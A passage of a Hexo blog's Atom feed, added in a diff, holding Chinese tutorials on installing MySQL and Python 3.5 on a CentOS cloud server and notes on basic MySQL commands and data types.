+<li><p>查看当前yum源可以安装的版本<code>yum repolist enabled | grep mysql</code></p>
+</li>
+<li>安装mysql<code>yum install mysql-community-server</code></li>
+<li>一个超级用户帐号’root’@’localhost 被创建，并且会为帐号生成随机密码，随机密码存储在错误日志文件里面。要显示它，使用以下命令：<br><code>grep &#39;temporary password&#39; /var/log/mysqld.log</code><br>在安装完成后应尽快使用刚才生成的随机密码登录mysql，然后修改超级用户帐号密码<br><code>shell&gt; mysql -u root -p</code><br><code>mysql&gt; ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;MyNewPass4!&#39;;</code><br>此时密码为<code>MyNewPass4!</code><br>因为有validate_password_policy限制，所以想要修的的简单点的密码可以在sql语句下<code>set global validate_password_policy=0;</code>,此时在使用上面修改密码的语句可以修改为8位以上任意密码了。<br>（后面在开启远程访问权限时还是会提示密码强度不够，个人使用的话不追求密码强度可以关闭validate_password:在/etc/my.cnf中[mysqld]选项下面添加下面一条语句即可。<code>validate_password=off</code>）</li>
+<li><p>设置字符集为utf-8：<br> 退出mysql，执行<code>service mysqld stop</code>终止mysql服务，<code>vim /etc/my.cnf</code>打开vim编辑配置文件，在最开始处加上</p>
+ <figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">	[client]  </div><div class="line">default-character-set=utf8</div></pre></td></tr></table></figure>
+<p> 在最后加上</p>
+ <figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">	# 修改处2：添加以下几行  </div><div class="line">default-storage-engine=INNODB  </div><div class="line">character-set-server=utf8  </div><div class="line">collation-server=utf8_general_ci </div><div class="line"></div><div class="line">[mysql]</div><div class="line">no-auto-rehash</div><div class="line">default-character-set=utf8</div></pre></td></tr></table></figure>
+<p> 保存退出，重新启动mysql<code>service mysqld restart</code></p>
+</li>
+<li>开启远程访问<code>grant all privileges on *.* to root@&#39;%&#39; identified by &#39;远程访问密码&#39;;</code>若提示密码不安全，按第6步最后关闭validate_password或者使用安全级别更高的密码。<br> 远程机器访问：<code>mysql -h服务器外网地址 -u root -p</code></li>
+</ol>
+<h2 id="七、配置python3-5运行环境"><a href="#七、配置python3-5运行环境" class="headerlink" title="七、配置python3.5运行环境"></a>七、配置python3.5运行环境</h2><ol>
+<li><p>准备编译环境</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><div class="line">yum groupinstall <span class="string">'Development Tools'</span></div><div class="line">yum install zlib-devel bzip2-devel  openssl-devel ncurses-devel</div></pre></td></tr></table></figure>
+</li>
+<li><p>下载Python3.5代码包，最新版本下载地址可去官网查看后替换</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><div class="line">wget https://www.python.org/ftp/python/<span class="number">3.5</span>.<span class="number">2</span>/Python-<span class="number">3.5</span>.<span class="number">2</span>.tgz</div></pre></td></tr></table></figure>
+</li>
+<li><p>编译</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><div class="line">tar Jxvf  Python-<span class="number">3.5</span>.<span class="number">2</span>.tar.xz</div><div class="line">cd Python-<span class="number">3.5</span>.<span class="number">2</span></div><div class="line">./configure --prefix=/usr/local/python3</div><div class="line">make &amp;&amp; make install</div></pre></td></tr></table></figure>
+</li>
+<li><p>设置环境变量</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><div class="line">echo <span class="string">'export PATH=$PATH:/usr/local/python3/bin'</span> &gt;&gt; ~/.bashrc</div><div class="line">echo /usr/local/lib &gt;&gt; /etc/ld.so.conf.d/local.conf</div><div class="line">ldconfig</div></pre></td></tr></table></figure>
+</li>
+<li><p>更新pip</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><div class="line">pip3 install --upgrade pip</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>使用pip安装模块<br><figure class="highlight powershell"><table><tr><td class="code"><pre><div class="line">pip3 install requests</div></pre></td></tr></table></figure></p>
+<ol>
+<li>兼容性问题<br>因为centos自带了python2，而上述安装方法安装后则与python3共存了，因此要执行python3相关的时候需要输入<code>python3 …………</code>,执行pip需要<code>pip3 …………</code></li>
+</ol>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;阿里云配置java-web环境&quot;&gt;&lt;a href=&quot;#阿里云配置java-web环境&quot; class=&quot;headerlink&quot; title=&quot;阿里云配置java web环境&quot;&gt;&lt;/a&gt;阿里云配置java web环境&lt;/h1&gt;&lt;h2 id=&quot;一、服务器配置&quot;&gt;&lt;a h
+    
+    </summary>
+    
+    
+      <category term="J2EE" scheme="http://jooop.github.io/tags/J2EE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>MySQL基础知识</title>
+    <link href="http://jooop.github.io/2016/10/22/MySQL%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
+    <id>http://jooop.github.io/2016/10/22/MySQL基础知识/</id>
+    <published>2016-10-22T07:57:50.000Z</published>
+    <updated>2016-10-25T08:39:36.509Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="MySQL基本配置及问题"><a href="#MySQL基本配置及问题" class="headerlink" title="MySQL基本配置及问题"></a>MySQL基本配置及问题</h1><h2 id="一、MySQL配置"><a href="#一、MySQL配置" class="headerlink" title="一、MySQL配置"></a>一、MySQL配置</h2><p>1.<a href="http://dev.mysql.com/downloads/mysql/" target="_blank" rel="external">下载</a>解压<br>2.将mysql目录下bin设置到Path<br>3.在mysql目录下新建文本文档，改名为<code>my.ini</code>，按照下面内容配置my.ini<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">[client]</div><div class="line">default-character-set=utf8</div><div class="line"></div><div class="line">[mysqld]</div><div class="line">character-set-server=utf8 </div><div class="line">collation-server=utf8_general_ci </div><div class="line">basedir=&quot;D:\mysql-5.7.16-winx64&quot;</div><div class="line">datadir=&quot;D:\mysql-5.7.16-winx64\data&quot;</div><div class="line"></div><div class="line">port=3306</div><div class="line"></div><div class="line">server_id=1</div><div class="line"></div><div class="line">[WinMySQLadmin]</div><div class="line">Server=D:\mysql-5.7.16-winx64\bin\mysqld.exe</div></pre></td></tr></table></figure></p>
+<ul>
+<li><p><strong>其中:</strong><br>以下内容改为自己的mysql放置目录。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">basedir=&quot;D:\mysql-5.7.16-winx64&quot;</div><div class="line">datadir=&quot;D:\mysql-5.7.16-winx64\data&quot;</div><div class="line">Server=D:\mysql-5.7.16-winx64\bin\mysqld.exe</div></pre></td></tr></table></figure>
+</li>
+<li><p><strong>注：</strong>使用其他编辑器编写该文件时使用UTF-8无BOM格式编码。不然后面命令会报错Found option without preceding group in config file。</p>
+</li>
+</ul>
+<p>4.安装MySQL服务:打开cmd命令提示符, 执行命令:<code>mysqld --install</code>安装服务,提示”Service successfully installed.”表示成功;</p>
+<p>5.执行<code>mysqld.exe --initialize</code> 命令,创建data</p>
+<p>6.启动:<code>net start MySQL</code></p>
+<p>7.卸载方法：<br>(1). <code>sc delete MySQL</code>卸载服务<br>(2). 清除path下的文件路径<br>(3). 清除注册表文件。</p>
+<h2 id="二、登陆MySQL"><a href="#二、登陆MySQL" class="headerlink" title="二、登陆MySQL"></a>二、登陆MySQL</h2><figure class="highlight"><table><tr><td class="code"><pre><div class="line">mysql -u root -p</div><div class="line">--提示输入密码，初始默认为空，进入后可以修改密码</div><div class="line">mysql&gt;set password =password('你的密码');</div><div class="line">mysql&gt;flush privileges;</div></pre></td></tr></table></figure>
+<h2 id="三、解决MySQL-5-7密码忘记"><a href="#三、解决MySQL-5-7密码忘记" class="headerlink" title="三、解决MySQL 5.7密码忘记"></a>三、解决MySQL 5.7密码忘记</h2><ol>
+<li>在任务管理器中结束mysqld.exe进程，确保mysql服务器端已结束运行。</li>
+<li>打开cmd命令提示符，进入mysql.exe所在的文件夹(例如：D:\mysql-5.7.16-winx64\bin)</li>
+<li>输入命令  <code>mysqld --skip-grant-tables</code> 回车，此时就跳过了mysql的用户验证。</li>
+<li>此时该窗口命令行无法操作，打开一个新的命令行,直接输入mysql，不需要带任何登录参数直接回车登陆上数据库。</li>
+<li>输入<code>show databases;</code>可以看到所有数据库说明成功登陆.</li>
+<li>输入 <code>use mysql;</code>选择mysql数据库。</li>
+<li>输入<code>update MySQL.user set authentication_string=password(&#39;root&#39;) where user=&#39;root&#39; ;</code>修改密码。</li>
+<li>重新打开dos再次登陆后若提示ERROR 1820 (HY000): You must reset your password using ALTER USER statement before executing this statement.<br>输入命令，重新设置密码即可解决。<code>SET PASSWORD = PASSWORD(&#39;123456&#39;);</code> </li>
+</ol>
+<hr>
+<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="一、对数据库的操作"><a href="#一、对数据库的操作" class="headerlink" title="一、对数据库的操作"></a>一、对数据库的操作</h2><h3 id="1-增删查改数据库"><a href="#1-增删查改数据库" class="headerlink" title="1.增删查改数据库"></a>1.增删查改数据库</h3><figure class="highlight"><table><tr><td class="code"><pre><div class="line">--1.查看所有的数据库</div><div class="line">mysql&gt; show databases;</div><div class="line"></div><div class="line"></div><div class="line">--2.查看当前使用的哪个数据库，如下为null的话表示没有使用。</div><div class="line">-mysql&gt; select database(); </div><div class="line">+------------+</div><div class="line">| database() |</div><div class="line">+------------+</div><div class="line">| NULL       |</div><div class="line">+------------+</div><div class="line"></div><div class="line"></div><div class="line">--3.创建名为mydb的数据库</div><div class="line">mysql&gt; create database mydb;	</div><div class="line"></div><div class="line"></div><div class="line">--4.查看mydb的编码格式。（默认编码格式在my.ini文件中配置，此处默认配置编码为utf-8）</div><div class="line">mysql&gt; show create database mydb;	</div><div class="line">+----------+---------------------------------------------------------------+</div><div class="line">| Database | Create Database                                               |</div><div class="line">+----------+---------------------------------------------------------------+</div><div class="line">| mydb     | CREATE DATABASE `mydb` /*!40100 DEFAULT CHARACTER SET utf8 */ |</div><div class="line">+----------+---------------------------------------------------------------+</div><div class="line"></div><div class="line"></div><div class="line">--5.选择使用mydb数据库</div><div class="line">mysql&gt; use mydb;</div><div class="line">Database changed</div><div class="line"></div><div class="line"></div><div class="line">--6.查看当前的数据库包含什么表</div><div class="line">mysql&gt; SHOW TABLES;	</div><div class="line"></div><div class="line"></div><div class="line">--7.删除数据库mydb</div><div class="line">mysql&gt; drop database mydb;</div></pre></td></tr></table></figure>
+<h3 id="2-备份与恢复数据库"><a href="#2-备份与恢复数据库" class="headerlink" title="2.备份与恢复数据库"></a>2.备份与恢复数据库</h3><p><strong>注：</strong><br>备份操作需要在dos命令行下执行。<br>恢复操作需要在mysql控制台操作。<br><figure class="highlight"><table><tr><td class="code"><pre><div class="line">--1.备份数据库</div><div class="line">--新打开一个dos窗口，不要登录数据库</div><div class="line">--（下面命令为将mydb数据库备份到D盘mydb1.sql中）</div><div class="line">mysqldump -u root -p mydb &gt; D:/mydb1.sql</div><div class="line"></div><div class="line"></div><div class="line">--2.恢复数据库</div><div class="line">--进到mysql控制台，创建一个新的空的数据库，使用它，进行回复操作</div><div class="line">--（下面命令为新建mydb2数据库，选择使用mydb2，将d盘下mydb1.sql中文件恢复至mydb2中）</div><div class="line">mysql&gt; create database mydb2;</div><div class="line">mysql&gt; use mydb2;</div><div class="line">mysql&gt; source d:/mydb1.sql</div></pre></td></tr></table></figure></p>
+<h3 id="mysql显示中文乱码问题："><a href="#mysql显示中文乱码问题：" class="headerlink" title="mysql显示中文乱码问题："></a>mysql显示中文乱码问题：</h3><ol>
+<li><code>show variables like &#39;char%&#39;;</code>查看字符编码集。</li>
+<li>若都为utf8，查看当前控制台字符集格式（win下dos一般为GBK）。</li>
+<li>设置返回字符集格式为utf8<code>set character_set_results=gbk;</code>。</li>
+</ol>
+<h2 id="二、对表的操作"><a href="#二、对表的操作" class="headerlink" title="二、对表的操作"></a>二、对表的操作</h2><h3 id="1-创建表"><a href="#1-创建表" class="headerlink" title="1.创建表"></a>1.创建表</h3><figure class="highlight sql"><table><tr><td class="code"><pre><div class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名(</div><div class="line">列名 列的数据类型,</div><div class="line">......</div><div class="line">)<span class="built_in">character</span> <span class="keyword">set</span> 字符集名称 //不写默认按数据库字符集类型</div><div class="line"></div><div class="line"><span class="comment">--eg:</span></div><div class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span>(</div><div class="line"><span class="keyword">id</span> <span class="built_in">int</span>,</div><div class="line"><span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">64</span>),</div><div class="line">pwd <span class="built_in">varchar</span>(<span class="number">64</span>),</div><div class="line">birthday <span class="built_in">date</span>);</div></pre></td></tr></table></figure>
+<hr>
+<h3 id="2-修改表结构"><a href="#2-修改表结构" class="headerlink" title="2.修改表结构"></a>2.修改表结构</h3><figure class="highlight sql"><table><tr><td class="code"><pre><div class="line"><span class="comment">--查看数据表的结构</span></div><div class="line">desc 表名;</div><div class="line"><span class="comment">--或者</span></div><div class="line"><span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> 表名;</div><div class="line"></div><div class="line"><span class="comment">--添加新的列</span></div><div class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">add</span> 列名 数据类型</div><div class="line"></div><div class="line"><span class="comment">--修改列的类型和大小</span></div><div class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">modify</span> 列名 新的数据类型</div><div class="line"></div><div class="line"><span class="comment">--修改列名、类型和大小</span></div><div class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">change</span> <span class="keyword">column</span> 原列名 新列名 新的数据类型;</div><div class="line"></div><div class="line"><span class="comment">--删除某列</span></div><div class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">drop</span>  列名</div><div class="line"></div><div class="line"><span class="comment">--修改表名</span></div><div class="line"><span class="keyword">rename</span> <span class="keyword">table</span> 原表名 <span class="keyword">to</span> 新表名</div><div class="line"></div><div class="line"><span class="comment">--修改表的字符集</span></div><div class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="built_in">character</span> <span class="keyword">set</span> 字符集名;</div><div class="line"></div><div class="line"><span class="comment">--查看创建表时所用的指令</span></div><div class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> 表名</div></pre></td></tr></table></figure>
+<h3 id="desc表时key栏的解释"><a href="#desc表时key栏的解释" class="headerlink" title="desc表时key栏的解释"></a>desc表时key栏的解释</h3><blockquote>
+<p>使用MySQL数据库desc 表名时，我们看到Key那一栏，可能会有4种值，即 ‘ ‘，’PRI’，’UNI’，’MUL’。</p>
+<ul>
+<li>如果Key是空的，那么该列值的可以重复，表示该列没有索引，或者是一个非唯一的复合索引的非前导列；</li>
+<li>如果Key是PRI，那么该列是主键的组成部分；</li>
+<li>如果Key是UNI，那么该列是一个唯一值索引的第一列（前导列），并别不能含有空值（NULL）；</li>
+<li>如果Key是MUL，那么该列的值可以重复，该列是一个非唯一索引的前导列（第一列）或者是一个唯一性索引的组成部分但是可以含有空值NULL。</li>
+<li>如果对于一个列的定义，同时满足上述4种情况的多种，比如一个列既是PRI，又是UNI，那么”desc 表名”的时候，显示的Key值按照优先级来显示 PRI-&gt;UNI-&gt;MUL。那么此时，显示PRI。</li>
+<li>一个唯一性索引列可以显示为PRI，并且该列不能含有空值，同时该表没有主键。</li>
+<li>一个唯一性索引列可以显示为MUL，如果多列构成了一个唯一性复合索引，因为虽然索引的多列组合是唯一的，比如ID+NAME是唯一的，但是没一个单独的列依然可以有重复的值，只要ID+NAME是唯一的即可。</li>
+</ul>
+</blockquote>
+<h2 id="三、CRUD语句"><a href="#三、CRUD语句" class="headerlink" title="三、CRUD语句"></a>三、CRUD语句</h2><h3 id="1-Insert"><a href="#1-Insert" class="headerlink" title="1.Insert"></a>1.Insert</h3><p><code>insert into 表名 (列名.....) values (值....);</code></p>
+<ul>
+<li>插入的数据应与字段的数据类型相同。</li>
+<li>数据的大小应在列的规定范围内，例如：不能将一个长度为80的字符串加入到长度为40的列中。</li>
+<li>字符和日期型数据应包含在单引号中。</li>
+<li>插入空值，不指定或insert into table value(null)</li>
+<li><p>在values中列出的数据位置必须与被加入的列的排列位置相对应。<br>eg:</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><div class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span> (<span class="keyword">id</span> <span class="built_in">int</span> ,<span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">64</span>));</div><div class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">test</span> (<span class="keyword">id</span>,<span class="keyword">name</span>) <span class="keyword">values</span>(<span class="number">3</span>,’aaa’);</div><div class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">test</span> (<span class="keyword">name</span>,<span class="keyword">id</span>) <span class="keyword">values</span>(’aaa’,<span class="number">3</span>);</div></pre></td></tr></table></figure>
+</li>
+<li><p><strong>若values全部对应写出，则可省略列名。</strong></p>
+</li>
+</ul>
+<h3 id="2-Update"><a href="#2-Update" class="headerlink" title="2.Update"></a>2.Update</h3><p><code>update 表名 set 列名=表达式 ... where 条件</code></p>
+<ul>
+<li>UPDATE语法可以用新值更新原有表行中的各列。</li>
+<li>SET子句指示要修改哪些列和要给予哪些值。</li>
+<li>WHERE子句指定应更新哪些行。如没有WHERE子句，则更新所有的行。</li>
+</ul>
+<h3 id="3-Delete"><a href="#3-Delete" class="headerlink" title="3.Delete"></a>3.Delete</h3><p><code>delele from 表名 where 条件;</code></p>
+<ul>
+<li>若不使用where子句，将删除表中所有数据。<br>所有要小心使用.</li>
+<li>Delete语句不能删除某一列的值（可使用update）</li>
+<li>使用delete语句仅删除记录，不删除表本身。如要删除表，使用drop table语句。</li>
+<li>同insert和update一样，从一个表中删除记录将引起其它表的参照完整性问题，在修改数据库数据时，头脑中应该始终不要忘记这个潜在的问题。</li>
+<li>删除表中数据也可使用TRUNCATE TABLE 语句，它和delete有所不同，truncate table 表名，可以删除表的记录，速度快，但不能回滚。</li>
+</ul>
+<h3 id="mysql中事务的特殊说明"><a href="#mysql中事务的特殊说明" class="headerlink" title="mysql中事务的特殊说明:"></a>mysql中事务的特殊说明:</h3><p>(1).  mysql 控制台是默认自动提交事务(dml)<br>(2). 要在控制台使用事务应:<br><code>set autocommit=false;</code><br><code>savepoint 保存点</code><br>//操作…<br><code>rollback to 保存点</code></p>
+<h3 id="4-Select"><a href="#4-Select" class="headerlink" title="4.Select"></a>4.Select</h3><p><code>select [distinct] 列名....（可运算） from 表名 where 条件;</code></p>
+<ul>
+<li>Select 指定查询哪些列的数据。</li>
+<li>column指定列名。</li>
+<li><em>号代表查询所有列。<br>`select </em> from 表名;`</li>
+<li>From指定查询哪张表。</li>
+<li>DISTINCT可选，指显示结果时，是否剔除重复数据<br><code>select distinct 列名 from 表名</code></li>
+<li>列可参与运算<br><code>select 列名1+列名2+... from 表名 whrer 条件</code></li>
+<li>列名可用as显示别名<br><code>select 列名 as &#39;别名&#39; from 表名 where 条件</code></li>
+</ul>
+<h4 id="1-where子句中常用的运算符"><a href="#1-where子句中常用的运算符" class="headerlink" title="(1).where子句中常用的运算符"></a>(1).where子句中常用的运算符</h4><p><img src="http://odl4eqqu9.bkt.clouddn.com/mysql/mysql_where1.png" alt="enter image description here"></p>
+<h4 id="2-order-by-子句"><a href="#2-order-by-子句" class="headerlink" title="(2).order by 子句"></a>(2).order by 子句</h4><p><code>select 列名1+列名2+... as &#39;别名&#39; from 表名 where 条件 order by &#39;别名&#39; desc;</code><br>对查询结果排序<br>最后加：<br>asc升序（默认）<br>desc降序</p>
+<h4 id="分页查找："><a href="#分页查找：" class="headerlink" title="分页查找："></a>分页查找：</h4><p><code>select * from 表名 where 条件 limit 起始行 输出行数</code></p>
+<ul>
+<li>起始行从0开始计算。</li>
+<li>输出行数表示从起始行开始输出多少行的数据。</li>
+</ul>
+<h3 id="5-其他函数"><a href="#5-其他函数" class="headerlink" title="5.其他函数"></a>5.其他函数</h3><h4 id="1-count"><a href="#1-count" class="headerlink" title="(1).count"></a>(1).count</h4><p><code>select count(*)|count(列名) from 表名 where 条件;</code><br>返回满足条件的某一列（行）的总数</p>
+<h4 id="2-sum"><a href="#2-sum" class="headerlink" title="(2).sum"></a>(2).sum</h4><p><code>select sum(列名){,sum列名} from 表名 where 条件;</code><br>对满足条件列的数值求和，返回该列中各行的数值的总和</p>
+<ul>
+<li>sum仅对数值列有效</li>
+<li>对多列求和不能缺少“,”，eg:<code>select sum(列名),sum(列名),sum(列名) from 表名;</code></li>
+<li>对多个列求总和，eg:<code>select sum(列名1+列名2+...) from 表名;</code></li>
+</ul>
+<h4 id="3-avg"><a href="#3-avg" class="headerlink" title="(3).avg"></a>(3).avg</h4><p><code>select avg(列名){,avg列名} from 表名 where 条件;</code><br>返回满足where条件的一列的平均值</p>
+<ul>
+<li>条件、用法同sum。</li>
+<li>若某一行数值为“null”，则该行不参与平均；若为“0”则参与平均</li>
+</ul>
+<h4 id="4-max-min"><a href="#4-max-min" class="headerlink" title="(4).max/min"></a>(4).max/min</h4><p><code>select max(列名) from 表名 where 条件;</code><br>返回满足where条件的一列的最大值</p>
+<h4 id="5-group-by"><a href="#5-group-by" class="headerlink" title="(5).group by"></a>(5).group by</h4><p><code>select 列名 from 表名 group by 待分组列名</code><br>对group by子句中的列进行分组</p>
+<h4 id="6-having"><a href="#6-having" class="headerlink" title="(6).having"></a>(6).having</h4><p><code>select 列名 from 表名 group by 待分组列名 having 条件</code></p>
+<ul>
+<li>having和where均可实现过滤，但having和以使用合计函数，通常跟在group by后，作用于组。</li>
+<li>顺序：group by ……having……order by……</li>
+</ul>
+<h4 id="7-日期和时间函数"><a href="#7-日期和时间函数" class="headerlink" title="(7).日期和时间函数"></a>(7).日期和时间函数</h4><p><img src="http://odl4eqqu9.bkt.clouddn.com/mysql/mysql_date_time.PNG" alt="enter image description here"></p>
+<p><code>select current_date() from dual;</code>//得到当前日期<br><code>select date(now()) from dual</code>//得到当前日<br><code>select * from 表名 where date_add(日期数据的列名, interval 2 hour) &gt;= now()</code>//得到日期数据的列名下，距今两个小时内的数据</p>
+<ul>
+<li>where date_add(日期/date/datetime/timestamp, interval 数字 <strong>type</strong>)<br>type类型可以是：<code>microsecond;second;minute;hour;day;week;month;quarter;year</code></li>
+</ul>
+<h4 id="8-字符串函数"><a href="#8-字符串函数" class="headerlink" title="(8).字符串函数"></a>(8).字符串函数</h4><p><img src="http://odl4eqqu9.bkt.clouddn.com/mysql/mysql_string_hanshu.PNG" alt="enter image description here"><br><code>select charset(列名) from 表名</code>//查看某列所用的字符集格式</p>
+<hr>
+<h2 id="四、定义表的约束"><a href="#四、定义表的约束" class="headerlink" title="四、定义表的约束"></a>四、定义表的约束</h2><h3 id="1、主键约束"><a href="#1、主键约束" class="headerlink" title="1、主键约束"></a>1、主键约束</h3><p><strong>primary key：</strong></p>
+<ul>
+<li>主键：用于唯一标识一条记录的约束，一张表最多只能有一个主键，不能为null，不允许为空，不允*许重复。</li>
+<li>用法：创建表时写在要设为主键的列的定义后，不需要分隔符。</li>
+<li>删除主键：<code>alter table tablename drop primary key;</code></li>
+</ul>
+<h3 id="2、主键自动增长"><a href="#2、主键自动增长" class="headerlink" title="2、主键自动增长"></a>2、主键自动增长</h3><p><strong>auto_increment</strong></p>
+<ul>
+<li>用法：同上。</li>
+</ul>
+<h3 id="3、唯一约束"><a href="#3、唯一约束" class="headerlink" title="3、唯一约束"></a>3、唯一约束</h3><p><strong>unique</strong> </p>
+<ul>
+<li>表的某列的值不能重复，可以为null(null可重复)，表中可以有多个unique。</li>
+</ul>
+<h3 id="4、非空约束"><a href="#4、非空约束" class="headerlink" title="4、非空约束"></a>4、非空约束</h3><p><strong>not null</strong></p>
+<ul>
+<li>MySQL中列的值默认可以为空，若不允许其为空则需not null说明</li>
+</ul>
+<h3 id="5、外键约束"><a href="#5、外键约束" class="headerlink" title="5、外键约束"></a>5、外键约束</h3><p><strong>foreign key</strong></p>
+<ul>
+<li>先建主表，在建从表</li>
+<li>用法：<ul>
+<li>在创建从表时，定义：<br><code>constraint 外键名称 foreign key(从表的外键列名) references 主表名(从表要指向的列)</code></li>
+<li>从表只能指向主表的主键列或者unique。</li>
+<li>外键列的数据类型和主表列的数据类型要一样。</li>
+<li>外键的值要么为null；要么需要在主表列中存在。</li>
+<li>外键可以指向本表的主键/unique列。</li>
+<li>外键名前缀：fk<em>，主键名前缀：pk</em></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1 id="MySQL的数据类型"><a href="#MySQL的数据类型" class="headerlink" title="MySQL的数据类型"></a>MySQL的数据类型</h1><h2 id="一、数值型"><a href="#一、数值型" class="headerlink" title="一、数值型"></a>一、数值型</h2><h3 id="1-bit-m"><a href="#1-bit-m" class="headerlink" title="1.bit(m)"></a>1.bit(m)</h3><p>m默认为 1 最大 64</p>
+<h3 id="2-tinyint-unsigned"><a href="#2-tinyint-unsigned" class="headerlink" title="2.tinyint [unsigned]"></a>2.tinyint [unsigned]</h3><p>如果是有符号则表示 -128 到 127 ，如果是无符号 0-255<br><strong>eg:</strong><br>create table test3(num tinyint) – -128 到  127<br>create table test4(num tinyint unsigned)  0 — 255  </p>
+<h3 id="3-smallint"><a href="#3-smallint" class="headerlink" title="3.smallint"></a>3.smallint</h3><p>samllint 是两个字节表示的.<br>带符号是  负的2的15次方 到 2的15次方-1 ,无符号 2的16方  -1</p>
+<h3 id="4-其它的数值类型"><a href="#4-其它的数值类型" class="headerlink" title="4.其它的数值类型"></a>4.其它的数值类型</h3><p><img src="http://odl4eqqu9.bkt.clouddn.com/mysql/mysql_shuju.png" alt="enter image description here"></p>
+<h3 id="5-float"><a href="#5-float" class="headerlink" title="5.float"></a>5.float</h3><p>FLOAT[(M,D)] [UNSIGNED]  是定长<br>m:表示有效位。d:表示小数点有几位。<br><strong>eg:</strong><br>create table test5( num float);<br>create table test6(num float(5,1));</p>
+<h3 id="6-double"><a href="#6-double" class="headerlink" title="6.double"></a>6.double</h3><p>其用法和float 类似，只是表示的范围更大,也是定长</p>
+<h3 id="7-numeric-m-d"><a href="#7-numeric-m-d" class="headerlink" title="7.numeric(m,d)"></a>7.numeric(m,d)</h3><p>用于表示小数，或者整数<br><strong>eg:</strong><br>create table test7 (num numeric); //这样其实就是可以存放整数.<br>create table test8 (num numeric(5,2));//这样就可以表示 有效为5,小数点有两位的数</p>
+<h2 id="二、字符串型"><a href="#二、字符串型" class="headerlink" title="二、字符串型"></a>二、字符串型</h2><h3 id="一览图"><a href="#一览图" class="headerlink" title="一览图:"></a>一览图:</h3><p> <img src="http://odl4eqqu9.bkt.clouddn.com/mysql/mysql_zifu.png" alt="enter image description here"></p>
+<h3 id="常用的有"><a href="#常用的有" class="headerlink" title="常用的有"></a>常用的有</h3><h3 id="1-char-m"><a href="#1-char-m" class="headerlink" title="1.char(m)"></a>1.char(m)</h3><p>m 范围是 0-255, 定长.<br>char(10) 若存放 ‘abc’ 字串，实际在表示  ‘abc &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;’;<br><strong>eg:</strong><br>create table test11 (name char(20));</p>
+<h3 id="2-varchar-m"><a href="#2-varchar-m" class="headerlink" title="2.varchar(m)"></a>2.varchar(m)</h3><p>m 表示大小 ,范围 0-65535， 变长<br>varchar(20) 若存放 ‘abc’ 字串，实际在表示 ‘abc’;<br><strong>建议:</strong><br>若表的某列长度固定，比如 产品编号..学号. .. 而且在 255内，应当使用char<br>若长度不能取得，或者长度 大于255 小于 65535 则使用varchar</p>
+<h3 id="3-text"><a href="#3-text" class="headerlink" title="3.text"></a>3.text</h3><p>该类型可以表示更大的字串.</p>
+<h2 id="三、日期类型"><a href="#三、日期类型" class="headerlink" title="三、日期类型"></a>三、日期类型</h2><h3 id="1-date"><a href="#1-date" class="headerlink" title="1.date"></a>1.date</h3><p>日期 (年-月-日)<br>create table test12(birthday date);<br>对于date 只保存 年-月-日</p>
+<h3 id="2-datetime"><a href="#2-datetime" class="headerlink" title="2.datetime"></a>2.datetime</h3><p>日期时间类型<br>create table test13(hiredate datetime);</p>
+<h3 id="3-timestamp"><a href="#3-timestamp" class="headerlink" title="3.timestamp"></a>3.timestamp</h3><p>邮戳： 该类型可以保存 年-月-日 : 时:分:秒<br>和datetime 最大的区别:当 update 某条记录的时候，该列值自动更新<br>create table test14 (name varchar(64) , sal float, hiredate1 timestamp, hiredate2 datetime);</p>
+<hr>
+<h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><p><a href="http://c.biancheng.net/cpp/html/1450.html" target="_blank" rel="external">Mysql命令desc：获取数据表结构</a><br><a href="http://www.cnblogs.com/mr-wid/archive/2013/05/09/3068229.html#d9" target="_blank" rel="external">21分钟 MySQL 入门教程</a><br>韩顺平MySQL视频讲解</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;MySQL基本配置及问题&quot;&gt;&lt;a href=&quot;#MySQL基本配置及问题&quot; class=&quot;headerlink&quot; title=&quot;MySQL基本配置及问题&quot;&gt;&lt;/a&gt;MySQL基本配置及问题&lt;/h1&gt;&lt;h2 id=&quot;一、MySQL配置&quot;&gt;&lt;a href=&quot;#一、My
+    
+    </summary>
+    
+    
+      <category term="MySQL" scheme="http://jooop.github.io/tags/MySQL/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>JSP基础</title>
+    <link href="http://jooop.github.io/2016/10/14/JSP%E5%9F%BA%E7%A1%80/"/>
+    <id>http://jooop.github.io/2016/10/14/JSP基础/</id>
+    <published>2016-10-14T12:29:50.000Z</published>
+    <updated>2016-10-15T17:50:55.670Z</updated>
+    
